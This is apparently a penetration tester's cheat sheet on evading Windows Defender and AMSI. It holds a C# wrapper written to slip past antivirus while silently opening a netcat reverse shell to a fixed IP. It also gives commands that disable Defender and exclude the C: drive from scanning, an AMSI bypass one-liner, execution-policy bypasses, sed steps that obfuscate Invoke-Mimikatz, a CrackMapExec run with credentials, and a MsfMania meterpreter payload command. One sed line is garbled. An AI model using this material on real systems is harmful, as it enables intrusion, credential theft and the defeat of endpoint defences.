# Windows Defender and AMSI Bypass


use INvoke Obfuscation script from github
https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Invoke-Obfuscation.ps1

https://medium.com/@ammadb/invoke-obfuscation-hiding-payloads-to-avoid-detection-87de291d61d3







# Wrapper reverse shell exeutable code (BYpass AV and windows defender)
  
  THis csharp code can be commpiled into exeutable using mono-devel compiler
  THis will make a execuatble which is a wrapper and will not be suspicious to AV and defenses. BUt internally it executes our malicuous code
  
  
  
  .......................
  
//IMporting basic modules which will help us start system processes
using System;  
using System.Diagnostics;


namespace Wrapper{
    class Program{
        static void Main()

       {
         
         //Creating an Process class object which is imported from System module
          Process proc = new Process();
          //Creating process info telling it instruction on what to do when started in system memory
          ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-cyberjunkie.exe", "10.50.49.32 10000 -e cmd.exe");
         
         
         //restrictig service to create a gui which may make users suspicious thats why disabling it
          procInfo.CreateNoWindow = true;
          //starting the proces
          proc.StartInfo = procInfo;
          proc.Start();

                               
        }
    }
}

  
  
  .......................
  
  compile this with  
  
  > mcs filename.cs
  
  now transfer the exeutable to target windows and make it execute somehow :)))
  









#### Disable Windows defender

 > "c:\Program Files\Windows Defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true

#### POwershell execution policy bypass



> powershell -ep bypass

> function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  


> PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1


> PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1






####  Excluding C directory from antivirus scan as a safe side
 
 > powershell.exe
 > Add-MpPreference -ExclusionPath "c:\"
 
#### AMSI bypass in powershell

> powershell.exe 
> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true) 

#### stop windows defender service (admin privileges)

> sc stop WinDefend


#### Disable realtime monitoring Powershell (admin privileges)

> Set-MpPreference -DisableRealTimeMonitoring $true



#### obfuscating powershell scripts to bypass AV

IN below example invoke-mimikatz.ps1 is obfuscated so antivirus dont detect it

We can use this as an example for any powershell scripts because AV looks for malicuous strings like script name or string CREDS or etc. We can bypass this by changing the script contents but keeping the functionality intact.its like changing variable names in code.


sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1

sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1

sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1

sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1

sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' 
Invoke-Mimikatz.ps1

sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions 
\$Win32Functions #\-/g" Invoke-Mimikatz./usr/share/doc/python3-impacket/examples/smbserver.py

# Powershell Scripts Obfuscater

Resources : https://www.varonis.com/blog/powershell-obfuscation-stealth-through-confusion-part-i/

Use powerop.py

or 




# Crackmapexec AV bypassing



## Using our own amsi bypass file and then execute through CME 

>  crackmapexec smb 192.168.125.133 -u fcastle -p 'Password1' -d HYDRA.local -M empire_exec -o LISTENER=final --amsi-bypass bypassfile


## Similiarly we can use --obfs flag to obfusctae our modules to try to get stealthy







# To obfuscate msf payloads we can use phantom evasion or msf mania



### msfmania

> python3 MsfMania.py -a x64 -p windows/x64/meterpreter/reverse_http -lh 192.168.125.128 -lp 6969 -o update -it local


> python3 MsfMania.py -h



### Phantom-Evasion


This tool has a nice interface and we can obfuscate our msf paylaods of windows/linux/persistence/postexp/privesc type

